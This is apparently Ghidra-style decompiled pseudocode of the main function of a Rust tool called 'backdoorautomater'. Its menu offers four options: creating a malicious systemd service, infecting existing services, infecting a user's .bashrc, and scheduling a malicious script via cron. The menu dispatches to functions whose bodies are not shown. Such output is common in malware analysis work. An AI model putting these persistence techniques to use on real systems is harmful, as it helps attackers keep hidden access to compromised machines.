void _ZN17backdoorautomater4main17h9fa6341046b633c3E(void)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  uint uVar4;
  undefined8 uVar5;
  uint extraout_EDX;
  undefined auVar6 [16];
  undefined8 local_3b8;
  undefined8 uStack_3b0;
  undefined8 local_3a8;
  undefined4 local_398;
  undefined4 uStack_394;
  undefined4 uStack_390;
  undefined4 uStack_38c;
  undefined8 local_388;
  undefined8 local_380;
  undefined8 uStack_378;
  undefined8 local_370;
  undefined8 uStack_368;
  undefined8 uStack_360;
  undefined8 local_358;
  undefined8 uStack_350;
  undefined8 local_348;
  undefined8 local_340;
  undefined8 uStack_338;
  undefined8 local_330;
  undefined8 local_328;
  undefined8 uStack_320;
  undefined8 local_318;
  undefined8 local_310;
  undefined8 uStack_308;
  undefined8 local_300;
  undefined8 local_2f8;
  uint local_2f0;
  undefined8 local_2e8;
  undefined8 uStack_2e0;
  undefined8 local_2d8;
  undefined8 local_2c8;
  undefined8 uStack_2c0;
  undefined8 local_2b8;
  undefined8 local_2a8;
  undefined8 uStack_2a0;
  undefined8 local_298;
  undefined local_290 [152];
  undefined local_1f8 [152];
  undefined local_160 [152];
  undefined local_c8 [152];
  
  do {
    local_380 = &PTR_DAT_0032adb0;
    uStack_378 = 1;
    local_370 = 8;
    uStack_368 = 0;
    uStack_360 = 0;
    _ZN3std2io5stdio6_print17h9670eaecb29bc3fcE(&local_380);
    local_380 = &PTR_s_1_Create_new_systemd_malicious_s_0032adc0;
    uStack_378 = 1;
    local_370 = 8;
    uStack_368 = 0;
    uStack_360 = 0;
    _ZN3std2io5stdio6_print17h9670eaecb29bc3fcE(&local_380);
    local_380 = &PTR_s_2_Infect_existing_systemd_servic_0032add0;
    uStack_378 = 1;
    local_370 = 8;
    uStack_368 = 0;
    uStack_360 = 0;
    _ZN3std2io5stdio6_print17h9670eaecb29bc3fcE(&local_380);
    local_380 = &PTR_s_3_Infect__bashrc_of_current_user_0032ade0;
    uStack_378 = 1;
    local_370 = 8;
    uStack_368 = 0;
    uStack_360 = 0;
    _ZN3std2io5stdio6_print17h9670eaecb29bc3fcE(&local_380);
    local_380 = &PTR_s_4_Schedule_malicious_script_with_0032adf0;
    uStack_378 = 1;
    local_370 = 8;
    uStack_368 = 0;
    uStack_360 = 0;
    _ZN3std2io5stdio6_print17h9670eaecb29bc3fcE(&local_380);
    local_3b8 = 0;
    uStack_3b0 = 1;
    local_3a8 = 0;
                    /* try { // try from 00165821 to 001658a9 has its CatchHandler @ 00165e3f */
    local_380 = (undefined **)(*(code *)PTR__ZN3std2io5stdio5stdin17h333095a056b9945dE_00368938)();
    auVar6 = (*(code *)PTR__ZN3std2io5stdio5Stdin9read_line17h820297227bc0cfb0E_00368e88)
                       (&local_380,&local_3b8);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h53a72b4a2a5f7bb1E
              (auVar6._0_8_,auVar6._8_8_,&PTR_DAT_0032ae00);
    auVar6 = _ZN4core3str21__LT_impl_u20_str_GT_12trim_matches17heb9c2373ab7cadcfE
                       (uStack_3b0,local_3a8);
    uVar4 = (*(code *)
              PTR__ZN4core3num59__LT_impl_u20_core__str__traits__FromStr_u20_for_u20_u8_GT_8from_str17h751c4fd84625d916E_003682d0
            )(auVar6._0_8_,auVar6._8_8_);
    _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
              (&local_380,"Concert String to Integer: Error",0x20);
    local_388 = local_370;
    local_398 = (undefined4)local_380;
    uStack_394 = local_380._4_4_;
    uStack_390 = (undefined4)uStack_378;
    uStack_38c = uStack_378._4_4_;
    _ZN78__LT_alloc__string__String_u20_as_u20_core__ops__arith__Add_LT__RF_str_GT__GT_3add17h6b8d6456597bb7a1E
              (&local_380,&local_398,uStack_3b0,local_3a8);
                    /* try { // try from 001658b4 to 001658cd has its CatchHandler @ 00165e30 */
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17hd2cf924265706b91E
              (uVar4 & 1,extraout_EDX & 0xff,uStack_378,local_370,&PTR_DAT_0032ae18);
                    /* try { // try from 001658ce to 001658d5 has its CatchHandler @ 00165e3f */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_380);
    _ZN5alloc3vec16Vec_LT_T_C_A_GT_5clear17hef16271c1d0d6175E(&local_3b8);
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_3b8);
  } while ((char)extraout_EDX == '\0');
  local_380 = (undefined **)0x0;
  uStack_378 = 1;
  local_370 = 0;
  uStack_368 = 0;
  uStack_360 = 1;
  local_358 = 0;
  uStack_350 = 0;
  local_348 = 1;
  local_2f0 = local_2f0 & 0xffffff00;
  local_340 = 0;
  uStack_338 = 0;
  local_330 = 1;
  local_328 = 0;
  uStack_320 = 0;
  local_318 = 1;
  local_310 = 0;
  uStack_308 = 0;
  local_300 = 1;
  local_2f8 = 0;
  switch(extraout_EDX & 0xff) {
  case 1:
                    /* try { // try from 001659a2 to 001659d4 has its CatchHandler @ 00165dca */
    _ZN17backdoorautomater5Param9set_param17h82809e6fdedb22bdE(&local_380,1);
    _ZN63__LT_backdoorautomater__Param_u20_as_u20_core__clone__Clone_GT_5clone17h134900a9f6f88e9aE
              (local_290,&local_380);
    _ZN17backdoorautomater9sanitizer18sanitize_param_hub17h407aa3fa6f2031daE(local_290,1);
    local_2d8 = local_358;
    local_2e8 = uStack_368;
    uStack_2e0 = uStack_360;
    local_3a8 = local_340;
    local_3b8 = uStack_350;
    uStack_3b0 = local_348;
    local_388 = local_370;
    local_398 = (undefined4)local_380;
    uStack_394 = local_380._4_4_;
    uStack_390 = (undefined4)uStack_378;
    uStack_38c = uStack_378._4_4_;
                    /* try { // try from 00165a27 to 00165a46 has its CatchHandler @ 00165dbf */
    uVar5 = _ZN17backdoorautomater10newservice13write_service17hf90b4724373f44a5E
                      (&local_2e8,&local_3b8,&local_398,local_2f0);
    bVar1 = true;
    _ZN17backdoorautomater9sanitizer18sanitize_return_fn17hb2c462d03cd2292cE(uVar5);
    bVar3 = true;
    break;
  case 2:
                    /* try { // try from 00165c01 to 00165c33 has its CatchHandler @ 00165dca */
    _ZN17backdoorautomater5Param9set_param17h82809e6fdedb22bdE(&local_380,2);
    _ZN63__LT_backdoorautomater__Param_u20_as_u20_core__clone__Clone_GT_5clone17h134900a9f6f88e9aE
              (local_1f8,&local_380);
    _ZN17backdoorautomater9sanitizer18sanitize_param_hub17h407aa3fa6f2031daE(local_1f8,2);
    local_2b8 = local_358;
    local_2c8 = uStack_368;
    uStack_2c0 = uStack_360;
    local_2d8 = local_310;
    local_2e8 = uStack_320;
    uStack_2e0 = local_318;
    local_3a8 = local_370;
    local_3b8 = local_380;
    uStack_3b0 = uStack_378;
    local_388 = local_340;
    local_398 = (undefined4)uStack_350;
    uStack_394 = uStack_350._4_4_;
    uStack_390 = (undefined4)local_348;
    uStack_38c = local_348._4_4_;
                    /* try { // try from 00165c9e to 00165cc5 has its CatchHandler @ 00165dbf */
    uVar5 = _ZN17backdoorautomater13modifyservice11get_service17h8cd53f8d8d7b2c85E
                      (&local_2c8,&local_2e8,local_2f0,&local_3b8,&local_398);
    bVar1 = false;
    _ZN17backdoorautomater9sanitizer18sanitize_return_fn17hb2c462d03cd2292cE(uVar5);
    bVar3 = true;
    break;
  case 3:
                    /* try { // try from 00165a4e to 00165a80 has its CatchHandler @ 00165dca */
    _ZN17backdoorautomater5Param9set_param17h82809e6fdedb22bdE(&local_380,3);
    _ZN63__LT_backdoorautomater__Param_u20_as_u20_core__clone__Clone_GT_5clone17h134900a9f6f88e9aE
              (local_160,&local_380);
    _ZN17backdoorautomater9sanitizer18sanitize_param_hub17h407aa3fa6f2031daE(local_160,3);
    local_2b8 = local_370;
    local_2c8 = local_380;
    uStack_2c0 = uStack_378;
    local_2d8 = local_340;
    local_2e8 = uStack_350;
    uStack_2e0 = local_348;
    local_3a8 = local_310;
    local_3b8 = uStack_320;
    uStack_3b0 = local_318;
    local_388 = local_2f8;
    local_398 = (undefined4)uStack_308;
    uStack_394 = uStack_308._4_4_;
    uStack_390 = (undefined4)local_300;
    uStack_38c = local_300._4_4_;
                    /* try { // try from 00165aea to 00165b06 has its CatchHandler @ 00165d85 */
    _ZN17backdoorautomater11shellscript13create_script17h6e2940071419697fE
              (&local_2c8,&local_2e8,&local_3b8,&local_398,local_2f0);
    bVar2 = false;
    goto LAB_00165bf6;
  case 4:
                    /* try { // try from 00165b11 to 00165b43 has its CatchHandler @ 00165dca */
    _ZN17backdoorautomater5Param9set_param17h82809e6fdedb22bdE(&local_380,4);
    _ZN63__LT_backdoorautomater__Param_u20_as_u20_core__clone__Clone_GT_5clone17h134900a9f6f88e9aE
              (local_c8,&local_380);
    _ZN17backdoorautomater9sanitizer18sanitize_param_hub17h407aa3fa6f2031daE(local_c8,4);
    local_298 = local_370;
    local_2a8 = local_380;
    uStack_2a0 = uStack_378;
    local_2b8 = local_340;
    local_2c8 = uStack_350;
    uStack_2c0 = local_348;
    local_2d8 = local_310;
    local_2e8 = uStack_320;
    uStack_2e0 = local_318;
    local_3a8 = local_2f8;
    local_3b8 = uStack_308;
    uStack_3b0 = local_300;
    local_388 = local_328;
    local_398 = (undefined4)uStack_338;
    uStack_394 = uStack_338._4_4_;
    uStack_390 = (undefined4)local_330;
    uStack_38c = local_330._4_4_;
                    /* try { // try from 00165bc4 to 00165bf2 has its CatchHandler @ 00165d85 */
    uVar5 = _ZN17backdoorautomater9cronshell11create_cron17h656d414225364c9cE
                      (&local_2a8,&local_2c8,&local_2e8,&local_3b8,local_2f0,&local_398);
    _ZN17backdoorautomater9sanitizer18sanitize_return_fn17hb2c462d03cd2292cE(uVar5);
    bVar2 = true;
LAB_00165bf6:
    bVar1 = true;
    bVar3 = false;
LAB_00165ce5:
                    /* try { // try from 00165ce5 to 00165cee has its CatchHandler @ 00165d5d */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&uStack_368);
    if (!bVar1) {
                    /* try { // try from 00165cf4 to 00165cfd has its CatchHandler @ 00165d58 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&uStack_350);
    }
    bVar1 = bVar3;
    if (bVar2) goto LAB_00165d19;
    break;
  default:
                    /* try { // try from 00165cca to 00165cd9 has its CatchHandler @ 00165d44 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_380);
    bVar2 = false;
    bVar1 = false;
    bVar3 = true;
    goto LAB_00165ce5;
  }
                    /* try { // try from 00165d11 to 00165d18 has its CatchHandler @ 00165d92 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&uStack_338);
LAB_00165d19:
  if (bVar1) {
                    /* try { // try from 00165d1e to 00165d25 has its CatchHandler @ 00165d8d */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&uStack_320);
  }
  if (bVar3) {
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&uStack_308);
  }
  return;
}